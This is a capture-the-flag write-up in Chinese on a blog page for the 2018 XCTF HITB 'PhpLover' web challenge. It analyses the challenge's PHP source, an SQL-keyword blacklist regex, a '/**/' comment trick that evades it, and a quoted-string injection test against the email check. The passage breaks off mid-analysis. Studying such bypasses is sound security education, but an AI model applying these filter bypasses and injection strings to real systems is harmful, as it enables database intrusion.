@@ -1,0 +1,2962 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        2018-XCTF-HITB-PhpLover · Sky&#39;s blog
+        
+    </title>
+    <link rel="icon" href= /assets/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro {
+            position: relative;
+            width: 100%;
+            height: 50vh;
+            overflow: hidden;
+            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
+        }
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20180120 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sky&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2018-XCTF-HITB-PhpLover</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Sky's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(/intro/post.png)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2018-XCTF-HITB-PhpLover
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = web>web</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/04/16</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>比赛的时候没能做出来，现在复现一下整个题目<br>开头先放参考链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/balsn/ctf_writeup/tree/master/20180411-hitbxctfqual#php-lover-bookgin--sces60107</span><br></pre></td></tr></table></figure></p>
+<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p>题目一共4个文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Controller</span><br><span class="line">Core</span><br><span class="line">templates</span><br><span class="line">uploads</span><br></pre></td></tr></table></figure></p>
+<p>其中Core中是类及方法定义<br>Controller是控制器，只有一个index.php<br>我们首先从这里突破</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>大致几个功能如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">view</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">export</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
+<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>我们依次分析过去，首先是容易存在注入的登录和注册<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user-&gt;islogin())&#123;</span><br><span class="line">            header(<span class="string">"Location:/index.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;user-&gt;login($_POST[<span class="string">'username'</span>],$_POST[<span class="string">'password'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user-&gt;islogin())&#123;</span><br><span class="line">                <span class="comment">//TODO！report it！</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"error! Login failed!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Login success!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">"templates/login.html"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>看到登录调用User类的login方法，我们跟一下这个login()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_string($username) <span class="keyword">or</span> !$username <span class="keyword">or</span> !filter($username)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/i'</span>,$username)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        $passhash=md5($password);</span><br><span class="line">    	<span class="keyword">if</span>($r=<span class="keyword">$this</span>-&gt;db-&gt;One(<span class="string">"users"</span>,<span class="keyword">array</span>(<span class="string">"username"</span> =&gt; <span class="string">"'$username'"</span>,<span class="string">"password"</span> =&gt; <span class="string">"'$passhash'"</span>)))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'user'</span>]=$r;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;islogin=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = $_SESSION[<span class="string">'user'</span>][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;username = $_SESSION[<span class="string">'user'</span>][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;nickname = $_SESSION[<span class="string">'user'</span>][<span class="number">2</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;email = $_SESSION[<span class="string">'user'</span>][<span class="number">4</span>];</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们跟一下username的过滤filter()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    $preg=<span class="string">"\\b(benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\()|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(`|\'|\").*?(`|\'|\"))FROM(\\&#123;.+\\&#125;|\\(.+\\)|\\s+?.+?|(`|\'|\").*?(`|\'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/"</span>.$preg.<span class="string">"/is"</span>,$string))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现正则过滤大量关键词，但是不难发现一个关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b</span><br></pre></td></tr></table></figure></p>
+<p>正则开头有一个b<br>我们查阅一下资料<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\b Any word boundary character</span><br></pre></td></tr></table></figure></p>
+<p>其功能是用来匹配单词<br>举个例子，官方给出这样的比较<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* The \b in the pattern indicates a word boundary, so only the distinct</span></span><br><span class="line"><span class="comment"> * word "web" is matched, and not a word partial like "webbing" or "cobweb" */</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\bweb\b/i"</span>, <span class="string">"PHP is the web scripting language of choice."</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A match was found."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A match was not found."</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\bweb\b/i"</span>, <span class="string">"PHP is the website scripting language of choice."</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A match was found."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A match was not found."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>前者输出<code>A match was found.</code><br>后者输出<code>A match was not found.</code><br>原因很简单，<code>\b</code>表示的为单词边界，而不是通配，并不是<code>*web*</code>这种，所以只有web才可以满足<br>像是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webing</span><br><span class="line">conwebing</span><br></pre></td></tr></table></figure></p>
+<p>都无法匹配<br>所以这就带来了问题<br>例如我们测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br><span class="line">select * from/**/users</span><br></pre></td></tr></table></figure></p>
+<p>测试过滤代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#$string = "select * from users";</span></span><br><span class="line">$string = <span class="string">"select * from/**/users"</span>;</span><br><span class="line">$preg=<span class="string">"\\b(benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\()|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(`|\'|\").*?(`|\'|\"))FROM(\\&#123;.+\\&#125;|\\(.+\\)|\\s+?.+?|(`|\'|\").*?(`|\'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/"</span>.$preg.<span class="string">"/is"</span>,$string))&#123;</span><br><span class="line">    var_dump(<span class="string">'hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>很明显前者打印<code>hacker</code><br>而后者Bypass过滤<br>与此同时<code>/**/</code>可以作为空格注入，达到一举两得的目的<br>虽然bypass了filter()，接下来还有新的过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/i'</span>,$username))</span><br></pre></td></tr></table></figure></p>
+<p>这里显然封杀了我们的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/</span><br></pre></td></tr></table></figure></p>
+<p>所以可见Login这条路不通，我们接着看注册</p>
+<h3 id="register"><a href="#register" class="headerlink" title="register"></a>register</h3><p>直接看注册代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user-&gt;islogin())&#123;</span><br><span class="line">         header(<span class="string">"Location:/index.php"</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'nickname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]))</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user-&gt;register($_POST[<span class="string">'username'</span>],$_POST[<span class="string">'nickname'</span>],$_POST[<span class="string">'password'</span>],$_POST[<span class="string">'email'</span>])===<span class="keyword">false</span>)&#123;</span><br><span class="line">                 <span class="comment">//TODO！report it！</span></span><br><span class="line">                 <span class="keyword">echo</span> <span class="string">"error! Register failed!"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     	<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="string">"Register success!"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">include</span>(<span class="string">"templates/register.html"</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>同样跟进register()方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username,$nickname,$password,$email)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_string($username) <span class="keyword">or</span> !$username <span class="keyword">or</span> !filter($username)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!is_string($nickname) <span class="keyword">or</span> !$nickname <span class="keyword">or</span> !filter($nickname)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!is_string($password) <span class="keyword">or</span> !$password) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!is_string($email) <span class="keyword">or</span> !$email <span class="keyword">or</span> !filter($email)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/i'</span>,$username)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/i'</span>,$nickname)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(([^&lt;&gt;()[\]\\.,;:\s@\"]+(\.[^&lt;&gt;()[\]\\.,;:\s@\"]+)*)|([\"].+[\"]))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/i'</span>,$email)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;db-&gt;One(<span class="string">"users"</span>,<span class="keyword">array</span>(<span class="string">"username"</span> =&gt; <span class="string">"'$username'"</span>))) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        $email=daddslashes($email);</span><br><span class="line">        $passhash=md5($password);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;Insert(<span class="string">"users"</span>,<span class="keyword">array</span>(<span class="string">"'$username'"</span>,<span class="string">"'$nickname'"</span>,<span class="string">"'$passhash'"</span>,<span class="string">"'$email'"</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以看到关键过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!is_string($email) <span class="keyword">or</span> !$email <span class="keyword">or</span> !filter($email)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/i'</span>,$username)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^[a-zA-Z0-9_]+$/i'</span>,$nickname)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^(([^&lt;&gt;()[\]\\.,;:\s@\"]+(\.[^&lt;&gt;()[\]\\.,;:\s@\"]+)*)|([\"].+[\"]))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/i'</span>,$email)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></p>
+<p>这里容易发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username</span><br><span class="line">$nickname</span><br></pre></td></tr></table></figure></p>
+<p>已经被封死<br>但是email似乎还有存活的空间<br>首先我们可以bypass filter()<br>然后是下面的正则匹配<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^(([^&lt;&gt;()[\]\\.,;:\s@\"]+(\.[^&lt;&gt;()[\]\\.,;:\s@\"]+)*)|([\"].+[\"]))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/i'</span>,$email)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></p>
+<p>我们看看是否能够bypass<br>当然这么长的正则，直接看很难受，我们拆分看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(([^&lt;&gt;()[\]\\.,;:\s@\&quot;]+(\.[^&lt;&gt;()[\]\\.,;:\s@\&quot;]+)*)|([\&quot;].+[\&quot;]))</span><br><span class="line"></span><br><span class="line">@</span><br><span class="line"></span><br><span class="line">((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))</span><br></pre></td></tr></table></figure></p>
+<p>首先可以大致拆成以@为截断的两部分<br>我们先对第一段拆分分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    (</span><br><span class="line">        [^&lt;&gt;()[\]\\.,;:\s@\&quot;]</span><br><span class="line">        +</span><br><span class="line">        (\.[^&lt;&gt;()[\]\\.,;:\s@\&quot;]+)</span><br><span class="line">    *)</span><br><span class="line">    |</span><br><span class="line">    ([\&quot;].+[\&quot;])</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>这里不难发现后者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">([\&quot;].+[\&quot;])</span><br></pre></td></tr></table></figure></p>
+<p>存在问题<br>只需要<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;</span><br></pre></td></tr></table></figure></p>
+<p>一对双引号包围即可，引号中间可以随意写入<br>我们测试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$string = <span class="string">'"\' and select 123 and 1=1#\'"'</span>;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^([\"].+[\"])$/i'</span>,$string))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'fuck'</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
